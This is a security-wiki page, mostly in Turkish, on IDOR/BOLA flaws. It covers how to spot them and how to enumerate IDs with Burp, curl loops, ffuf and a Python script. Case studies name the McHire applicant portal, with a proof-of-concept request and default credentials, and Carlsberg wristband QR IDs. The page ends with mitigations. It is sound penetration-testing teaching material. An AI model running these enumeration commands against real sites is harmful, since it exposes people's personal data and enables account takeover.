# IDOR (Insecure Direct Object Reference)

{{#include ../banners/hacktricks-training.md}}

IDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA), bir web veya API uç noktasının kullanıcı tarafından kontrol edilebilen ve dahili bir nesneye **doğrudan** erişmek için kullanılan bir tanımlayıcıyı ortaya çıkardığı veya kabul ettiği ve çağıranın bu nesneye erişmeye/değiştirmeye **yetkili olup olmadığını doğrulamadığı** durumlarda ortaya çıkar.
Başarılı sömürü genellikle horizontal or vertical privilege-escalation sağlar; örneğin diğer kullanıcıların verilerini okumak veya değiştirmek ve en kötü durumda full account takeover veya mass-data exfiltration ile sonuçlanabilir.

---
## 1. Potansiyel IDOR'ları Belirleme

1. **Bir nesneyi referans eden parametreleri** arayın:
* Yol: `/api/user/1234`, `/files/550e8400-e29b-41d4-a716-446655440000`
* Sorgu: `?id=42`, `?invoice=2024-00001`
* Body / JSON: `{"user_id": 321, "order_id": 987}`
* Başlıklar / Çerezler: `X-Client-ID: 4711`
2. Veri **okuyan veya güncelleyen** uç noktalarını tercih edin (`GET`, `PUT`, `PATCH`, `DELETE`).
3. Tanımlayıcıların **sıralı veya tahmin edilebilir** olup olmadığına dikkat edin – eğer sizin ID'niz `64185742` ise `64185741` muhtemelen vardır.
4. Gizli veya alternatif akışları keşfedin (ör. giriş sayfalarındaki *"Paradox team members"* linki) — bunlar ekstra API'ler açığa çıkarabilir.
5. Bir **kimlik doğrulanmış düşük ayrıcalikli oturum** kullanın ve sadece ID'yi değiştirin, **aynı token/cookie'yi koruyarak**. Bir yetkilendirme hatasının olmaması genellikle IDOR belirtisidir.

### Hızlı manuel müdahale (Burp Repeater)
```
PUT /api/lead/cem-xhr HTTP/1.1
Host: www.example.com
Cookie: auth=eyJhbGciOiJIUzI1NiJ9...
Content-Type: application/json

{"lead_id":64185741}
```
### Otomatik keşif (Burp Intruder / curl loop)
```bash
for id in $(seq 64185742 64185700); do
curl -s -X PUT 'https://www.example.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-H "Cookie: auth=$TOKEN" \
-d '{"lead_id":'"$id"'}' | jq -e '.email' && echo "Hit $id";
done
```
### Tahmin edilebilir indirme ID'lerini listeleme (ffuf)
Kimlik doğrulamalı dosya barındırma panelleri genellikle kullanıcı başına meta verileri tek `files` tablosunda saklar ve `/download.php?id=<int>` gibi bir indirme uç noktası sunar. Eğer handler yalnızca ID'nin var olup olmadığını kontrol ediyorsa (ve ID'nin kimlik doğrulaması yapılmış kullanıcıya ait olup olmadığını kontrol etmiyorsa), geçerli session cookie'nizle tam sayı aralığını tarayabilir ve diğer kullanıcıların yedeklerini/konfigürasyonlarını çalabilirsiniz:
```bash
ffuf -u http://file.era.htb/download.php?id=FUZZ \
-H "Cookie: PHPSESSID=<session>" \
-w <(seq 0 6000) \
-fr 'File Not Found' \
-o hits.json
jq -r '.results[].url' hits.json    # fetch surviving IDs such as company backups or signing keys
```
* `-fr` 404 tarzı şablonları kaldırır, böylece sadece gerçek bulgular kalır (e.g., IDs 54/150 leaking full site backups and signing material).
* Aynı FFUF workflow Burp Intruder veya bir curl loop ile de çalışır—IDs artırırken oturumunuzun açık kaldığından emin olun.

---

### Kullanıcı/dosya keşfi için hata-yanıtı oracle'ı

When a download endpoint accepts both a username and a filename (e.g. `/view.php?username=<u>&file=<f>`), subtle differences in error messages often create an oracle:

- Non-existent username → "User not found"
- Bad filename but valid extension → "File does not exist" (sometimes also lists available files)
- Bad extension → validation error

With any authenticated session, you can fuzz the username parameter while holding a benign filename and filter on the "user not found" string to discover valid users:
```bash
ffuf -u 'http://target/view.php?username=FUZZ&file=test.doc' \
-b 'PHPSESSID=<session-cookie>' \
-w /opt/SecLists/Usernames/Names/names.txt \
-fr 'User not found'
```
Geçerli kullanıcı adları belirlendikten sonra belirli dosyalar doğrudan istenebilir (ör. `/view.php?username=amanda&file=privacy.odt`). Bu desen genellikle diğer kullanıcıların belgelerinin yetkisiz ifşasına ve credential leakage ile sonuçlanır.

---
## 2. Real-World Case Study – McHire Chatbot Platform (2025)

Paradox.ai-powered **McHire** işe alım portalının bir değerlendirmesi sırasında aşağıdaki IDOR keşfedildi:

* Endpoint: `PUT /api/lead/cem-xhr`
* Authorization: herhangi bir restoran test hesabı için user session cookie
* Body parameter: `{"lead_id": N}` – 8 haneli, **sequential** sayısal tanımlayıcı

lead_id'yi küçülterek test yapan kişi rastgele başvuru sahiplerinin **full PII**'sini (isim, e-posta, telefon, adres, vardiya tercihleri) ve oturum kaçırmaya izin veren bir tüketici **JWT**'sini elde etti. `1 – 64,185,742` aralığının taranması yaklaşık **64 milyon** kaydı açığa çıkardı.

Proof-of-Concept request:
```bash
curl -X PUT 'https://www.mchire.com/api/lead/cem-xhr' \
-H 'Content-Type: application/json' \
-d '{"lead_id":64185741}'
```
Combined with **default admin credentials** (`123456:123456`) that granted access to the test account, the vulnerability resulted in a critical, company-wide data breach.

### Vaka Çalışması – Bileklik QR kodları as weak bearer tokens (2025–2026)

*Flow:* Sergi ziyaretçilerine QR kodlu bileklikler verildi; `https://homeofcarlsberg.com/memories/`'yi taramak tarayıcının **basılı bileklik ID**'sini alıp, hex-encode etmesine ve saklı medyayı (fotoğraflar/videolar + isimler) almak için bir `cloudfunctions.net` backend'ini çağırmasına izin veriyordu. Herhangi bir **session binding** veya user authentication yoktu—**knowledge of the ID = authorization**.

*Predictability:* Bileklik ID'leri `C-285-100` gibi kısa bir deseni takip ediyordu → ASCII hex `432d3238352d313030` (`43 2d 32 38 35 2d 31 30 30`). Olası kombinasyon sayısı yaklaşık ~26M olarak tahmin edildi; çevrimiçi olarak tükenmesi kolaydı.

*Exploitation workflow with Burp Intruder:*
1. **Payload generation:** Aday ID'ler oluşturun (ör. `[A-Z]-###-###`). Use a Burp Intruder **Pitchfork** or **Cluster Bomb** attack with positions for the letter and digits. Add a **payload processing rule → Add prefix/suffix → payload encoding: ASCII hex** böylece her istek backend'in beklediği hex string'i iletir.
2. **Response grep:** Intruder'da sadece geçerli yanıtlarda bulunan belirteçler için **grep-match** işaretleyin (ör. media URLs/JSON fields). Geçersiz ID'ler tipik olarak boş dizi/404 döndürüyordu.
3. **Throughput measurement:** Yaklaşık 1,000,000 ID ~2 saat içinde bir dizüstü bilgisayardan test edildi (~139 req/s). Bu hızla tüm keyspace (~26M) yaklaşık 52 saatte tükenirdi. Örnek çalışma zaten ~500 geçerli bilekliği (videolar + tam isimler) açığa çıkarmıştı.
4. **Rate-limiting verification:** Vendor throttling iddiasında bulunduktan sonra aynı Intruder konfigürasyonunu yeniden çalıştırın. Aynı throughput/hit-rate, kontrolün yok/etkisiz olduğunu gösterdi; enumeration kesintisiz devam etti.

Quick scriptable variant (client-side hex encoding):
```python
import requests

def to_hex(s):
return ''.join(f"{ord(c):02x}" for c in s)

for band_id in ["C-285-100", "T-544-492"]:
hex_id = to_hex(band_id)
r = requests.get("https://homeofcarlsberg.com/memories/api", params={"id": hex_id})
if r.ok and "media" in r.text:
print(band_id, "->", r.json())
```
> **Ders:** Kodlama (ASCII→hex/Base64) entropi eklemez; kısa ID'ler kozmetik kodlamaya rağmen sayılabilir hale gelip **bearer tokens** olur. Kullanıcı başına yetkilendirme + yüksek entropili gizli anahtarlar olmadan, medya/PII toplu olarak toplanabilir hatta “rate limiting” iddia edilse bile.

---
## 3. IDOR / BOLA Etkisi
* Yatay yükselme – **diğer kullanıcıların** verilerini okuma/güncelleme/silme.
* Dikey yükselme – düşük ayrıcalıklı kullanıcı admin'e özel işlevlere erişim kazanır.
* Kimlikler sıralıysa toplu veri ihlali (örn. başvuru ID'leri, faturalar).
* Token çalarak veya diğer kullanıcıların parolalarını sıfırlayarak hesap ele geçirme.

---
## 4. Önlemler ve En İyi Uygulamalar
1. **Nesne düzeyinde yetkilendirmeyi zorunlu kılın** her istekte (`user_id == session.user`).
2. Otomatik artan ID'ler yerine **dolaylı, tahmin edilemez tanımlayıcıları** (UUIDv4, ULID) tercih edin.
3. Yetkilendirmeyi **sunucu tarafında** uygulayın; gizli form alanlarına veya UI kontrollerine asla güvenmeyin.
4. Merkezi bir middleware'de **RBAC / ABAC** kontrolleri uygulayın.
5. ID'lerin numaralandırılmasını tespit etmek için **rate-limiting & logging** ekleyin.
6. Her yeni endpoint'i güvenlik testine tabi tutun (unit, integration ve DAST).

---
## 5. Araçlar
* **BurpSuite extensions**: Authorize, Auto Repeater, Turbo Intruder.
* **OWASP ZAP**: Auth Matrix, Forced Browse.
* **Github projects**: `bwapp-idor-scanner`, `Blindy` (bulk IDOR hunting).



## Referanslar
* [McHire Chatbot Platform: Default Credentials and IDOR Expose 64M Applicants’ PII](https://ian.sh/mcdonalds)
* [OWASP Top 10 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
* [How to Find More IDORs – Vickie Li](https://medium.com/@vickieli/how-to-find-more-idors-ae2db67c9489)
* [HTB Nocturnal: IDOR oracle → file theft](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
* [0xdf – HTB Era: predictable download IDs → backups and signing keys](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
* [Carlsberg memories wristband IDOR – predictable QR IDs + Intruder brute force (2026)](https://www.pentestpartners.com/security-blog/carlsberg-probably-not-the-best-cybersecurity-in-the-world/)
{{#include ../banners/hacktricks-training.md}}
